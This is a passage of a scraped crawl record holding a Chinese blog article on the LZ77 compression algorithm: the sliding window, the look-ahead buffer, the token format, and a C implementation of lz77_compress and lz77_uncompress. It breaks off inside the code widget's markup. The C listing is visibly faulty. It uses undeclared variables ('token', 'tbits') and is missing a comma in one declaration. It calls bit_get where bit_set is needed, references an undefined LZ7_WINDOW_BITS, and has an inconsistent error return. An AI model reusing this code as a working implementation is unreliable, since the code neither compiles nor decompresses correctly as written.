src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            应用软件开发，主要用python、sql        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/wx232824506\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/wx232824506/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 21</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/217248f366b3ffdce01fd5df8546529db6cbed0f.jpg"},{"url_object_id": "569d347b7faf6939bbf51a1b0f5d5c37", "title": ["数据压缩算法：LZ77 算法的分析与实现"], "url": "http://blog.jobbole.com/114214/", "create_date": "2018/07/17", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/95f95341b03e66babaadc935b51d6a24.jpg"], "praise_nums": "1", "comment_nums": 2, "fav_nums": 1, "tags": "IT技术, LZ77, 数据压缩", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/idreamo/p/9249367.html\">IDreamo</a>   </div><h3>LZ77简介</h3>\n<p>Ziv和Lempel于1977年发表题为“顺序数据压缩的一个通用算法（A Universal Algorithm for Sequential Data Compression ）”的论文，论文中描述的算法被后人称为LZ77算法。值得说的是，LZ77严格意义上来说不是一种算法，而是一种编码理论。同Huffman编码一样，只定义了原理，并没有定义如何实现。<strong>基于这种理论来实现的算法才称为LZ77算法，或者人们更愿意称为LZ77变种。</strong>实际上这类算法已经有很多了，比如LZSS、LZB、LZH等。至今，几乎我们日常使用的所有通用压缩工具，象ARJ，PKZip，WinZip，LHArc，RAR，GZip，ACE，ZOO，TurboZip，Compress，JAR„„甚至许多硬件如网络设备中内置的压缩算法，无一例外，都可以最终归结为这两个以色列人的杰出贡献。</p>\n<p><strong>LZ77是一种基于字典的算法，它将长字符串（也称为短语）编码成短小的标记，用小标记代替字典中的短语，从而达到压缩的目的。也就是说，它通过用小的标记来代替数据中多次重复出现的长串方法来压缩数据。其处理的符号不一定是文本字符，可以是任意大小的符号。</strong></p>\n<h3>短语字典的维护</h3>\n<p>不同的基于字典的算法使用不同的方法来维护它们的字典。<strong>LZ77使用的是一个前向缓冲区和一个滑动窗口</strong>。</p>\n<p><strong>LZ77首先将一部分数据载入前向缓冲区</strong>。为了便于理解前向缓冲区如何存储短语并形成字典，我们将缓冲区描绘成S<sub>1</sub>，…，S<sub>n</sub>的字符序列，P<sub>b</sub>是由字符组成的短语集合。从字符序列S<sub>1</sub>，…，S<sub>n</sub>，组成n个短语，定义如下：</p>\n<p>P<sub>b</sub> = {(S<sub>1</sub>),(S<sub>1</sub>,S<sub>2</sub>),…,(S<sub>1</sub>,…,S<sub>n</sub>)}</p>\n<p>例如，如果前向缓冲区包含字符(A,B,D)，那么缓冲区中的短语为{(A),(A,B),(A,B,D)}。</p>\n<p><strong>一旦数据中的短语通过前向缓冲区，那么它将移动到滑动窗口中，并变成字典的一部分。</strong>为理解短语是如何在滑动窗口中表示的，首先，把窗口想象成S<sub>1</sub>，…，S<sub>m</sub>的字符序列，且P<sub>w</sub>是由这些字符组成的短语集合。从序列S<sub>1</sub>，…，S<sub>m</sub>产生短语数据集合的过程如下：</p>\n<p>P<sub>w</sub> = {P<sub>1</sub>,P<sub>2</sub>,…,P<sub>m</sub>}，其中P<sub>i</sub> = {(S<sub>i</sub>),(S<sub>i</sub>,S<sub>i</sub>+1),…,(S<sub>i</sub>,S<sub>i</sub>+1,…,S<sub>m</sub>)}</p>\n<p>例如，如果滑动窗口中包含符号(A,B,C)，那么窗口和字典中的短语为{(A),(A,B),(A,B,C),(B),(B,C),(C)}。</p>\n<p><strong>LZ77算法的主要思想就是在前向缓冲区中不断寻找能够与字典中短语匹配的最长短语。</strong>以上面描述的前向缓冲区和滑动窗口为例，其最长的匹配短语为(A,B)。</p>\n<h3>压缩和解压缩数据</h3>\n<p>前向缓冲区和滑动窗口之间的匹配有两种情况：要么找到一个匹配短语，要么找不到匹配的短语。当找到最长的匹配时，将其编码成短语标记。</p>\n<p><strong>短语标记包含三个部分：1、滑动窗口中的偏移量（从头部到匹配开始的前一个字符）；2、匹配中的符号个数；3、匹配结束后，前向缓冲区中的第一个符号。</strong></p>\n<p>当没有找到匹配时，将未匹配的符号编码成符号标记。这个符号标记仅仅包含符号本身，没有压缩过程。事实上，我们将看到符号标记实际上比符号多一位，所以会出现轻微的扩展。</p>\n<p>一旦把n个符号编码并生成相应的标记，就将这n个符号从滑动窗口的一端移出，并用前向缓冲区中同样数量的符号来代替它们。然后，重新填充前向缓冲区。这个过程使滑动窗口中始终有最新的短语。滑动窗口和前向缓冲区具体维护的短语数量由它们自身的容量决定。</p>\n<p>下图（1）展示了用LZ77算法压缩字符串的过程，其中滑动窗口大小为8个字节，前向缓冲区大小为4个字节。在实际中，滑动窗口典型的大小为4KB（4096字节）。前向缓冲区大小通常小于100字节。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/370380549f00cdef220ed43b273bcd2b.png\" alt=\"\"></p>\n<p style=\"text-align: center;\">图（1）：使用LZ77算法对字符串ABABCBABABCAD进行压缩</p>\n<p>我们通过解码标记和保持滑动窗口中符号的更新来解压缩数据，其过程类似于压缩过程。<strong>当解码每个标记时，将标记编码成字符拷贝到滑动窗口中。每当遇到一个短语标记时，就在滑动窗口中查找相应的偏移量，同时查找在那里发现的指定长度的短语。每当遇到一个符号标记时，就生成标记中保存的一个符号。</strong>下图（2）展示了解压缩图（1）中数据的过程。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/53b421fbf28829eb0fc8cfc38c1f8c96.png\" alt=\"\"></p>\n<p style=\"text-align: center;\">图（2）：使用LZ77算法对图（1）中压缩的字符串进行解压缩</p>\n<h3>LZ77的效率</h3>\n<p>用LZ77算法压缩的程度取决于很多因素，例如，选择滑动窗口的大小，为前向缓冲区设置的大小，以及数据本身的熵。最终，压缩的程度取决于能匹配的短语的数量和短语的长度。大多数情况下，LZ77比霍夫曼编码有着更高的压缩比，但是其压缩过程相对较慢。</p>\n<p>用LZ77算法压缩数据是非常耗时的，国为要花很多时间寻找窗口中的匹配短语。然而在通常情况下，LZ77的解压缩过程要比霍夫曼编码的解压缩过程耗时要少。LZ77的解压缩过程非常快是因为每个标记都明确地告诉我们在缓冲区中哪个位置可以读取到所需要的符号。事实上，我们最终只从滑动窗口中读取了与原始数据数量相等的符号而已。</p>\n<h3>LZ77的接口定义</h3>\n<p><strong>lz77_compress</strong></p>\n<hr>\n<p><strong>int lz77_compress(const unsigned char *original, unsigned char **compressed, int size);</strong></p>\n<p>返回值：如果数据压缩成功，返回压缩后数据的字节数；否则返回-1；</p>\n<p>描述：   用LZ77算法压缩缓冲区original中的数据，original包含size个字节的空间。压缩后的数据存入缓冲区compressed中。lz77_compress需要调用malloc来动态的为compressed分配存储空间，当这块空间不再使用时，由调用者调用函数free来释放空间。</p>\n<p>复杂度：O(n)，其中n是原始数据中符号的个数。</p>\n<p><strong>lz77_uncompress</strong></p>\n<hr>\n<p><strong>int lz77_uncompress(const unsigned char *compressed, unsigned char **original);</strong></p>\n<p>返回值：如果解压缩数据成功，返回恢复后数据的字节数；否则返回-1；</p>\n<p>描述：   用LZ77算法解压缩缓冲区compressed中的数据。假定缓冲区包含的数据之前由lz77_compress压缩。恢复后的数据存入缓冲区original中。lz77_uncompress函数调用malloc来动态的为original分配存储空间。当这块存储空间不再使用时，由调用者调用函数free来释放空间。</p>\n<p>复杂度：O（n）其中n是原始数据中符号的个数。</p>\n<h3>LZ77的实现与分析</h3>\n<p>LZ77算法，通过一个滑动窗口将前向缓冲区中的短语编码成相应的标记，从而达到压缩的目的。在解压缩的过程中，将每个标记解码成短语或符号本身。要做到这些，必须要不断地更新窗口，这样，在压缩过程中的任何时刻，窗口都能按照规则进行编码。在本节所有的示例中，原始数据中的一个符号占一个字节。</p>\n<p><strong>lz77_compress</strong></p>\n<p><strong>lz77_compress操作使用LZ77算法来压缩数据。</strong>首先，它将数据中的符号写入压缩数据的缓冲区中，并同时初始化滑动窗口和前向缓冲区。随后，前向缓冲区将用来加载符号。</p>\n<p>压缩发生在一个循环中，循环会持续迭代直到处理完所有符号。使用ipos来保存原始数据中正在处理的当前字节，并用opos来保存向压缩数据缓冲区写入的当前位。在循环的每次迭代中，调用compare_win来确定前向缓冲区与滑动窗口中匹配的最长短语。函数compare_win返回最长匹配串的长度。</p>\n<p>当找到一个匹配串时，compare_win设置offset为滑动窗口中匹配串的位置，同时设置next为前向缓冲区中匹配串后一位的符号。在这种情况下，向压缩数据中写入一个短语标记（如图3-a）。在本节展示的实现中，对于偏移量offset短语标记需要12位，这是因为滑动窗口的大小为4KB（4096字节）。此时短语标志需要5位来表示长度，因为在一个32字节的前向缓冲区中，不会有匹配串超过这个长度。当没有找到匹配串时，compare_win返回，并且设置next为前向缓冲区起始处未匹配的符号。在这种情况下，向压缩数据中写入一个符号（如图3-b）。无论向压缩数据中写入的是一个短语还是一个符号，在实际写入标记之前，都需要调用网络函数htonl来转换串，以保证标记是大端格式。这种格式是在实际压缩数据和解压缩数据时所要求的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/747fcf6077eb0f28fa191a2299ec991e.png\" alt=\"\"></p>\n<p style=\"text-align: center;\">图3：LZ77中的短语标记（A）和符号标记（B）的结构</p>\n<p>一旦将相应的标记写入压缩数据的缓冲区中，就调整滑动窗口和前向缓冲区。要使数据通过滑动窗口，将数据从右边滑入窗口，从左边滑出窗口。同样，在前向缓冲区中也是相同的滑动过程。移动的字节数与标记中编码的字符数相等。</p>\n<p>lz77_compress的时间复杂度为O(n)，其中n是原始数据中符号的个数。这是因为，对于数据中每个n/c个编码的标记，其中1/c是一个代表编码效率的常量因素，调用一次compare_win。函数compare_win运行一段固定的时间，因为滑动窗口和前向缓冲区的大小均为常数。然而，这些常量比较大，会对lz77_compress的总体运行时间产生较大的影响。所以，lz77_compress的时间复杂度是O(n)，但其实际的复杂度会受其常量因子的影响。这就解释了为什么在用lz77进行数据压缩时速度非常慢。</p>\n<p><strong>lz77_uncompress</strong></p>\n<p><strong>lz77_uncompress操作解压缩由lz77_compress压缩的数据。</strong>首先，该函数从压缩数据中读取字符，并初始化滑动窗口和前向缓冲区。</p>\n<p>解压缩过程在一个循环中执行，此循环会持续迭代执行直到所有的符号处理完。使用ipos来保存向压缩数据中写入的当前位，并用opos来保存写入恢复数据缓冲区中当前字节。在循环的每次迭代过程中，首先从压缩数据读取一位来确定要解码的标记类型。</p>\n<p>在解析一个标记时，如果读取的首位是1，说明遇到了一个短语标记。此时读取它的每个成员，查找滑动窗口中的短语，然后将短语写入恢复数据缓冲区中。当查找每个短语时，调用网络函数ntohl来保证窗口中的偏移量和长度的字节顺序是与操作系统匹配的。这个转换过程是必要的，因为从压缩数据中读取出来的偏移量和长度是大端格式的。在数据被拷贝到滑动窗口之前，前向缓冲区被用做一个临时转换区来保存数据。最后，写入该标记编码的匹配的符号。如果读取的标记的首位是0，说明遇到了一个符号标记。在这种情况下，将该标记编码的匹配符号写入恢复数据缓冲区中。</p>\n<p>一旦将解码的数据写入恢复数据的缓冲区中，就调整滑动窗口。要将数据通过滑动窗口，将数据从右边滑入窗口，从左边滑出窗口。移动的字节数与从标记中解码的字符数相等。</p>\n<p>lz77_uncompress的时间复杂度为O(n)，其中n是原始数据中符号的个数。</p>\n<p><strong>示例：LZ77的实现文件 </strong></p>\n<p><strong>(示例所需要的头文件信息请查阅前面的文章：<a href=\"https://www.cnblogs.com/idreamo/p/9153691.html\" target=\"_blank\">数据压缩的重要组成部分–位操作</a>)</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623045dbd1b466646927\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/*lz77.c*/\r\n#include &lt;netinet/in.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;string.h&gt;\r\n\r\n#include \"bit.h\"\r\n#include \"compress.h\"\r\n\r\n/*compare_win 确定前向缓冲区中与滑动窗口中匹配的最长短语*/\r\nstatic int compare_win(const unsigned char *window, const unsigned char *buffer,\r\n                       int *offset, unsigned char *next)\r\n{\r\n    int match,longest,i,j,k;\r\n\r\n    /*初始化偏移量*/\r\n    *offset = 0;\r\n\r\n    /*如果没有找到匹配，准备在前向缓冲区中返回0和下一个字符*/\r\n    longest = 0;\r\n    *next = buffer[0];\r\n\r\n    /*在前向缓冲区和滑动窗口中寻找最佳匹配*/\r\n    for(k=0; k&lt;LZ77_WINDOW_SIZE; k++)\r\n    {\r\n        i = k;\r\n        j = 0;\r\n        match = 0;\r\n\r\n        /*确定滑动窗口中k个偏移量匹配的符号数*/\r\n        while(i&lt;LZ77_WINDOW_SIZE &amp;&amp; j&lt;LZ77_BUFFER_SIZE - 1)\r\n        {\r\n            if(window[i] != buffer[j])\r\n                break;\r\n\r\n            match++;\r\n            i++;\r\n            j++;\r\n        }\r\n\r\n        /*跟踪最佳匹配的偏移、长度和下一个符号*/\r\n        if(match &gt; longest)\r\n        {\r\n            *offset = k;\r\n            longest = match;\r\n            *next = buffer[j];\r\n        }\r\n    }\r\n    return longest;\r\n}\r\n\r\n/*lz77_compress  使用lz77算法压缩数据*/\r\nint lz77_compress(const unsigned char *original,unsigned char **compressed,int size)\r\n{\r\n    unsigned char     window[LZ77_WINDOW_SIZE],\r\n                      buffer[LZ77_BUFFER_SIZE],\r\n                      *comp,\r\n                      *temp,\r\n                      next;\r\n    int               offset,\r\n                      length,\r\n                      remaining,\r\n                      hsize,\r\n                      ipos,\r\n                      opos,\r\n                      tpos,\r\n                      i;\r\n    /*使指向压缩数据的指针暂时无效*/\r\n    *compressed = NULL;\r\n\r\n    /*写入头部信息*/\r\n    hsize = sizeof(int);\r\n    if((comp = (unsigned char *)malloc(hsize)) == NULL)\r\n        return -1;\r\n    memcpy(comp,&amp;size,sizeof(int));\r\n\r\n    /*初始化滑动窗口和前向缓冲区(用0填充)*/\r\n    memset(window, 0 , LZ77_WINDOW_SIZE);\r\n    memset(buffer, 0 , LZ77_BUFFER_SIZE);\r\n\r\n    /*加载前向缓冲区*/\r\n    ipos = 0;\r\n\r\n    for(i=0; i&lt;LZ77_BUFFER_SIZE &amp;&amp; ipos &lt; size; i++)\r\n    {\r\n        buffer[i] = original[ipos];\r\n        ipos++;\r\n    }\r\n\r\n    /*压缩数据*/\r\n    opos = hsize * 8;\r\n    remaining = size;\r\n\r\n    while(remaining &gt; 0)\r\n    {\r\n        if((length = compare_win(window,buffer,&amp;offset,&amp;next)) != 0)\r\n        {\r\n            /*编码短语标记*/\r\n            token = 0x00000001 &lt;&lt; (LZ77_PHRASE_BITS - 1);\r\n\r\n            /*设置在滑动窗口找到匹配的偏移量*/\r\n            token = token | (offset &lt;&lt; (LZ77_PHRASE_BITS - LZ77_TYPE_BITS - LZ77_WINOFF_BITS));\r\n\r\n            /*设置匹配串的长度*/\r\n            token = token | (length &lt;&lt; (LZ77_PHRASE_BITS - LZ77_TYPE_BITS - LZ77_WINOFF_BITS - LZ77_BUFLEN_BITS));\r\n\r\n            /*设置前向缓冲区中匹配串后面紧邻的字符*/\r\n            token = token | next;\r\n\r\n            /*设置标记的位数*/\r\n            tbits = LZ77_PHRASE_BITS;\r\n        }\r\n        else\r\n        {\r\n            /*编码一个字符标记*/\r\n            token = 0x00000000;\r\n\r\n            /*设置未匹配的字符*/\r\n            token = token | next;\r\n\r\n            /*设置标记的位数*/\r\n            tbits = LZ77_SYMBOL_BITS;\r\n        }\r\n\r\n        /*确定标记是大端格式*/\r\n        token = htonl(token);\r\n\r\n        /*将标记写入压缩缓冲区*/\r\n        for(i=0; i&lt;tbits; i++)\r\n        {\r\n            if(opos % 8 == 0)\r\n            {\r\n                /*为压缩缓冲区分配临时空间*/\r\n                if((temp = (unsigned char *)realloc(comp,(opos / 8) + 1)) == NULL)\r\n                {\r\n                    free(comp);\r\n                    return -1;\r\n                }\r\n                comp = temp;\r\n            }\r\n\r\n            tpos = (sizeof(unsigned long ) * 8) - tbits + i;\r\n            bit_set(comp,opos,bit_get((unsigned char *)&amp;token,tpos));\r\n            opos++;\r\n        }\r\n        /*调整短语长度*/\r\n        length++;\r\n\r\n        /*从前向缓冲区中拷贝数据到滑动窗口中*/\r\n        memmove(&amp;window[0],&amp;window[length],LZ77_WINDOW_SIZE - length);\r\n        memmove(&amp;window[LZ77_WINDOW_SIZE - length],&amp;buffer[0],length);\r\n        memmove(&amp;buffer[0],&amp;buffer[length],LZ77_BUFFER_SIZE - length);\r\n        /*向前向缓冲区中读取更多数据*/\r\n        for(i = LZ77_BUFFER_SIZE - length; i&lt;LZ77_BUFFER_SIZE &amp;&amp; ipos &lt;size; i++)\r\n        {\r\n            buffer[i] = original[ipos];\r\n            ipos++;\r\n        }\r\n\r\n        /*调整剩余未匹配的长度*/\r\n        remaining = remaining - length;\r\n    }\r\n    /*指向压缩数据缓冲区*/\r\n    *compressed = comp;\r\n    /*返回压缩数据中的字节数*/\r\n    return ((opos - 1) / 8) + 1;\r\n}\r\n\r\n/*lz77_uncompress  解压缩由lz77_compress压缩的数据*/\r\nint lz77_uncompress(const unsigned char *compressed,unsigned char **original)\r\n{\r\n    unsigned char window[LZ77_WINDOW_SIZE],\r\n                  buffer[LZ77_BUFFER_SIZE]\r\n                  *orig,\r\n                  *temp,\r\n                  next;\r\n    int           offset,\r\n                  length,\r\n                  remaining,\r\n                  hsize,\r\n                  size,\r\n                  ipos,\r\n                  opos,\r\n                  tpos,\r\n                  state,\r\n                  i;\r\n    /*使指向原始数据的指针暂时无效*/\r\n    *original = orig = NULL;\r\n\r\n    /*获取头部信息*/\r\n    hsize = sizeof(int);\r\n    memcpy(&amp;size,compressed,sizeof(int));\r\n\r\n    /*初始化滑动窗口和前向缓冲区*/\r\n    memset(window, 0, LZ77_WINDOW_SIZE);\r\n    memset(buffer, 0, LZ77_BUFFER_SIZE);\r\n\r\n    /*解压缩数据*/\r\n    ipos = hsize * 8;\r\n    opos = 0;\r\n    remaining = size;\r\n\r\n    while(remaining &gt; 0)\r\n    {\r\n        /*获取压缩数据中的下一位*/\r\n        state = bit_get(compressed,ipos);\r\n        ipos++;\r\n\r\n        if(state == 1)\r\n        {\r\n            /*处理的是短语标记*/\r\n            memset(&amp;offset, 0, sizeof(int));\r\n\r\n            for(i=0; i&lt;LZ77_WINOFF_BITS; i++)\r\n            {\r\n                tpos = (sizeof(int)*8) - LZ77_WINOFF_BITS + i;\r\n                bit_set((unsigned char *)&amp;offset, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            memset(&amp;length, 0, sizeof(int));\r\n            for(i=0; i&lt;LZ77_BUFLEN_BITS; i++)\r\n            {\r\n                tpos = (sizeof(int)*8) - LZ77_BUFLEN_BITS + i;\r\n                bit_set((unsigned char *)&amp;length, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            next = 0x00;\r\n            for(i=0; i&lt;LZ77_NEXT_BITS; i++)\r\n            {\r\n                tpos = (sizeof(unsigned char)*8) - LZ77_NEXT_BITS + i;\r\n                bit_set((unsigned char *)&amp;next, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            /*确保偏移和长度对系统有正确的字节排序*/\r\n            offset = ntohl(offset);\r\n            length = ntohl(length);\r\n\r\n            /*将短语从滑动窗口写入原始数据缓冲区*/\r\n            i=0;\r\n            if(opos&gt;0)\r\n            {\r\n                if((temp = (unsigned char *)realloc(orig,opos+length+1)) == NULL)\r\n                {\r\n                    free(orig);\r\n                    return 1;\r\n                }\r\n                orig = temp;\r\n            }\r\n            else\r\n            {\r\n                if((orig = (unsigned char *)malloc(length+1)) == NULL)\r\n                    return -1;\r\n            }\r\n\r\n            while(i&lt;length &amp;&amp; remaining&gt;0)\r\n            {\r\n                orig[opos] = window[offset + i];\r\n                opos++;\r\n                /*在前向缓冲区中记录每个符号，直到准备更新滑动窗口*/\r\n                buffer[i] = window[offset + i];\r\n                i++;\r\n\r\n                /*调整剩余符号总数*/\r\n                remaining --;\r\n            }\r\n\r\n            /*将不匹配的符号写入原始数据缓冲区*/\r\n            if(remaining &gt; 0)\r\n            {\r\n                orig[opos] = next;\r\n                opos++;\r\n\r\n                /*仍需在前向缓冲区中记录此符号*/\r\n                buffer[i] = next;\r\n\r\n                /*调整剩余字符总数*/\r\n                remaining--;\r\n            }\r\n            /*调整短语长度*/\r\n            length++;\r\n        }\r\n        else\r\n        {\r\n            /*处理的是字符标记*/\r\n            next = 0x00;\r\n            for(i=0; i&lt;LZ77_NEXT_BITS; i++)\r\n            {\r\n                tpos = (sizeof(unsigned char)*8) - LZ77_NEXT_BITS + i;\r\n                bit_get((unsigned char *)&amp;next, tpos,bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            /*将字符写入原始数据缓冲区*/\r\n            if(opos &gt; 0)\r\n            {\r\n                if((temp = (unsigned char*)realloc(orig,opos+1)) == NULL)\r\n                {\r\n                    free(orig);\r\n                    return -1;\r\n                }\r\n                orig = temp;\r\n            }\r\n            else\r\n            {\r\n                if((orig = (unsigned char *)malloc(1)) == NULL)\r\n                return -1;\r\n            }\r\n            orig[opos] = next;\r\n            opos++;\r\n\r\n            /*在前向缓冲区中记录当前字符*/\r\n            if(remaining &gt; 0)\r\n                buffer[0] = next;\r\n            /*调整剩余数量*/\r\n            remaining--;\r\n\r\n            /*设置短语长度为1*/\r\n            length = 1;\r\n        }\r\n        /*复制前向缓冲中的数据到滑动窗口*/\r\n        memmove(&amp;window[0], &amp;window[length],LZ7_WINDOW_BITS - length);\r\n        memmove(&amp;window[LZ77_WINDOW_SIZE - length], &amp;buffer[0], length);\r\n    }\r\n    /*指向原始数据缓冲区*/\r\n    *original = orig;\r\n\r\n    /*返回解压缩的原始数据中的字节数*/\r\n    return  opos;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-58\">58</div><div 